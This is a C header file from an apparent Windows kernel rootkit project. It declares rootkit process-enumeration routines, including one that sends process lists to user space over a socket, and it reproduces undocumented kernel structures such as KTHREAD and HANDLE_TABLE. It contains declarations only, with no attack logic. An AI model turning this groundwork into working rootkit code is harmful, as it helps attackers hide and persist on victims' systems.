#pragma once

#pragma once

#define PROCESS_QUERY_INFORMATION 0x0400
#define ASSERT_PROCESS(object)

typedef struct _ROOTKIT_PROCESS_ENTRY {
#ifndef _WIN64
	LIST_ENTRY Entry;
#else
	LIST_ENTRY64 Entry;
#endif
	UINT32 pid;
	UINT32 ppid;
	ULONG_PTR Eprocess;
	CHAR ProcessCreationTime[260];
	CHAR ImageFileName[50];
	BOOLEAN IsProcessProtected;
}ROOTKIT_PROCESS_ENTRY, *PROOTKIT_PROCESS_ENTRY;

typedef struct _ROOTKIT_PROCESS_LIST_HEAD {

	ULONG NumberOfProcesses;
#ifndef _WIN64
	LIST_ENTRY Entry;
#else
	LIST_ENTRY64 Entry;
#endif
}ROOTKIT_PROCESS_LIST_HEAD, *PROOTKIT_PROCESS_LIST_HEAD;

// LOW AMOUNT INFORMATION

typedef struct _ROOTKIT_LOW_AMOUNT_INFORMATION_KERNEL
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER ExitTime;
	LONG NumberOfHandles;
}ROOTKIT_LOW_AMOUNT_INFORMATION_KERNEL, *PROOTKIT_LOW_AMOUNT_INFORMATION_KERNEL;

// USER SPACE STRUCTURE

typedef struct _ROOTKIT_LOW_AMOUNT_USERMODE
{
	CHAR Ktime[255];
	CHAR Utime[255];
	CHAR CreateTime[255];
	CHAR ExitTime[255];
}ROOTKIT_LOW_AMOUNT_USERMODE, *PROOTKIT_LOW_AMOUNT_USERMODE;

typedef enum _ROOTKIT_INFORMATION_AMOUNT
{
	LowAmountInformation = 1,
	MedimumAmountInformation,
	HighAmountInformation

}ROOTKIT_INFORMATION_AMOUNT;

typedef enum _THREAD_STATE {
	StateInitialized,
	StateReady,
	StateRunning,
	StateStandby,
	StateTerminated,
	StateWait,
	StateTransition,
	StateUnknown
}THREAD_STATE;

typedef struct _SYSTEM_THREAD {
	LARGE_INTEGER   KernelTime;
	LARGE_INTEGER   UserTime;
	LARGE_INTEGER   CreateTime;
	ULONG           WaitTime;
	PVOID          StartAddress;
	CLIENT_ID       ClientId;
	ULONG           Priority;
	LONG            BasePriority;
	ULONG           ContextSwitchCount;
	THREAD_STATE    State;
	ULONG           WaitReason;
}SYSTEM_THREAD, *PSYSTEM_THREAD;


typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG           NextEntryOffset;
	ULONG           NumberOfThreads;
	LARGE_INTEGER   Reserved[3];
	LARGE_INTEGER   CreateTime;
	LARGE_INTEGER   UserTime;
	LARGE_INTEGER   KernelTime;
	UNICODE_STRING  ImageName;
	ULONG          BasePriority;
	HANDLE          ProcessId;
	HANDLE          ParentProcessId;
	ULONG           HandleCount;
	ULONG           Reserved2[2];
	VM_COUNTERS     VMCounters;
	IO_COUNTERS     IOCounters;
	SYSTEM_THREAD   Threads[1];
}SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

/*/////////////////////////////////////
//
// ROOTKIT ROUTINES
//
*//////////////////////////////////////

PROOTKIT_PROCESS_LIST_HEAD g_process_head;
PROOTKIT_PROCESS_LIST_HEAD kernel_get_processes(IN PROOTKIT_API_HASH Hash);
ULONG rk_copy_process_list_to_buffer(IN PROOTKIT_PROCESS_ENTRY Buffer, IN PROOTKIT_API_HASH Hash);
BOOLEAN rk_send_process_to_userspace(IN PFILE_OBJECT SocketObject, IN PROOTKIT_API_HASH Hash);


/*///////////////////////////////////
//
//	Kernel Ps Routines
//
*////////////////////////////////////

NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(IN HANDLE Handle, OUT PEPROCESS *Eprocess);
NTKERNELAPI BOOLEAN PsIsProtectedProcess(IN PEPROCESS Eprocess);
NTKERNELAPI PPEB PsGetProcessPeb(IN PEPROCESS Eprocess);


/*/////////////////////////////////
//
//	INTERNAL PROCEDURES
//
*//////////////////////////////////


typedef struct _KTHREAD
{
	DISPATCHER_HEADER Header;
	UINT64 CycleTime;
	ULONG HighCycleTime;
	UINT64 QuantumTarget;
	PVOID InitialStack;
	PVOID StackLimit;
	PVOID KernelStack;
	ULONG ThreadLock;
	union
	{
		KAPC_STATE ApcState;
		UCHAR ApcStateFill[23];
	};
	CHAR Priority;
	USHORT NextProcessor;
	USHORT DeferredProcessor;
	ULONG ApcQueueLock;
	ULONG ContextSwitches;
	UCHAR State;
	UCHAR NpxState;
	UCHAR WaitIrql;
	CHAR WaitMode;
	LONG WaitStatus;
	union
	{
		PKWAIT_BLOCK WaitBlockList;
		PKGATE GateObject;
	};
	union
	{
		ULONG KernelStackResident : 1;
		ULONG ReadyTransition : 1;
		ULONG ProcessReadyQueue : 1;
		ULONG WaitNext : 1;
		ULONG SystemAffinityActive : 1;
		ULONG Alertable : 1;
		ULONG GdiFlushActive : 1;
		ULONG Reserved : 25;
		LONG MiscFlags;
	};
	UCHAR WaitReason;
	UCHAR SwapBusy;
	UCHAR Alerted[2];
	union
	{
		LIST_ENTRY WaitListEntry;
		SINGLE_LIST_ENTRY SwapListEntry;
	};
	PKQUEUE Queue;
	ULONG WaitTime;
	union
	{
		struct
		{
			SHORT KernelApcDisable;
			SHORT SpecialApcDisable;
		};
		ULONG CombinedApcDisable;
	};
	PVOID Teb;
	union
	{
		KTIMER Timer;
		UCHAR TimerFill[40];
	};
	union
	{
		ULONG AutoAlignment : 1;
		ULONG DisableBoost : 1;
		ULONG EtwStackTraceApc1Inserted : 1;
		ULONG EtwStackTraceApc2Inserted : 1;
		ULONG CycleChargePending : 1;
		ULONG CalloutActive : 1;
		ULONG ApcQueueable : 1;
		ULONG EnableStackSwap : 1;
		ULONG GuiThread : 1;
		ULONG ReservedFlags : 23;
		LONG ThreadFlags;
	};
	union
	{
		KWAIT_BLOCK WaitBlock[4];
		struct
		{
			UCHAR WaitBlockFill0[23];
			UCHAR IdealProcessor;
		};
		struct
		{
			UCHAR WaitBlockFill1[47];
			CHAR PreviousMode;
		};
		struct
		{
			UCHAR WaitBlockFill2[71];
			UCHAR ResourceIndex;
		};
		UCHAR WaitBlockFill3[95];
	};
	UCHAR LargeStack;
	LIST_ENTRY QueueListEntry;
	//PKTRAP_FRAME TrapFrame;
	PVOID FirstArgument;
	union
	{
		PVOID CallbackStack;
		ULONG CallbackDepth;
	};
	PVOID ServiceTable;
	UCHAR ApcStateIndex;
	CHAR BasePriority;
	CHAR PriorityDecrement;
	UCHAR Preempted;
	UCHAR AdjustReason;
	CHAR AdjustIncrement;
	UCHAR Spare01;
	CHAR Saturation;
	ULONG SystemCallNumber;
	ULONG Spare02;
	ULONG UserAffinity;
	PKPROCESS Process;
	ULONG Affinity;
	PKAPC_STATE ApcStatePointer[2];
	union
	{
		KAPC_STATE SavedApcState;
		UCHAR SavedApcStateFill[23];
	};
	CHAR FreezeCount;
	CHAR SuspendCount;
	UCHAR UserIdealProcessor;
	UCHAR Spare03;
	UCHAR Iopl;
	PVOID Win32Thread;
	PVOID StackBase;
	union
	{
		KAPC SuspendApc;
		struct
		{
			UCHAR SuspendApcFill0[1];
			CHAR Spare04;
		};
		struct
		{
			UCHAR SuspendApcFill1[3];
			UCHAR QuantumReset;
		};
		struct
		{
			UCHAR SuspendApcFill2[4];
			ULONG KernelTime;
		};
		struct
		{
			UCHAR SuspendApcFill3[36];
			//PKPRCB WaitPrcb;
		};
		struct
		{
			UCHAR SuspendApcFill4[40];
			PVOID LegoData;
		};
		UCHAR SuspendApcFill5[47];
	};
	UCHAR PowerState;
	ULONG UserTime;
	union
	{
		KSEMAPHORE SuspendSemaphore;
		UCHAR SuspendSemaphorefill[20];
	};
	ULONG SListFaultCount;
	LIST_ENTRY ThreadListEntry;
	LIST_ENTRY MutantListHead;
	PVOID SListFaultAddress;
	PVOID MdlForLockedTeb;
} KTHREAD, *PKTHREAD;

/*/////////////////////////////////////
//
//	HANDLE RELATED INTERNAL STRUCTURES
//
*//////////////////////////////////////

typedef struct _HANDLE_TABLE_ENTRY_INFO
{
	ULONG AuditMask;
} HANDLE_TABLE_ENTRY_INFO, *PHANDLE_TABLE_ENTRY_INFO;

typedef struct _HANDLE_TABLE_ENTRY
{
	union
	{
		PVOID Object;
		ULONG ObAttributes;
		PHANDLE_TABLE_ENTRY_INFO InfoTable;
		ULONG Value;
	};
	union
	{
		ULONG GrantedAccess;
		struct
		{
			USHORT GrantedAccessIndex;
			USHORT CreatorBackTraceIndex;
		};
		LONG NextFreeTableEntry;
	};
} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;

typedef struct _HANDLE_TRACE_DB_ENTRY
{
	CLIENT_ID ClientId;
	PVOID Handle;
	ULONG Type;
	VOID * StackTrace[16];
} HANDLE_TRACE_DB_ENTRY, *PHANDLE_TRACE_DB_ENTRY;

typedef struct _HANDLE_TRACE_DEBUG_INFO
{
	LONG RefCount;
	ULONG TableSize;
	ULONG BitMaskFlags;
	FAST_MUTEX CloseCompactionLock;
	ULONG CurrentStackIndex;
	HANDLE_TRACE_DB_ENTRY TraceDb[1];
} HANDLE_TRACE_DEBUG_INFO, *PHANDLE_TRACE_DEBUG_INFO;

typedef struct _HANDLE_TABLE
{
	ULONG TableCode;
	PEPROCESS QuotaProcess;
	PVOID UniqueProcessId;
	EX_PUSH_LOCK HandleLock;
	LIST_ENTRY HandleTableList;
	EX_PUSH_LOCK HandleContentionEvent;
	PHANDLE_TRACE_DEBUG_INFO DebugInfo;
	LONG ExtraInfoPages;
	ULONG Flags;
	ULONG StrictFIFO : 1;
	LONG FirstFreeHandle;
	PHANDLE_TABLE_ENTRY LastFreeHandleEntry;
	LONG HandleCount;
	ULONG NextHandleNeedingPool;
} HANDLE_TABLE, *PHANDLE_TABLE;
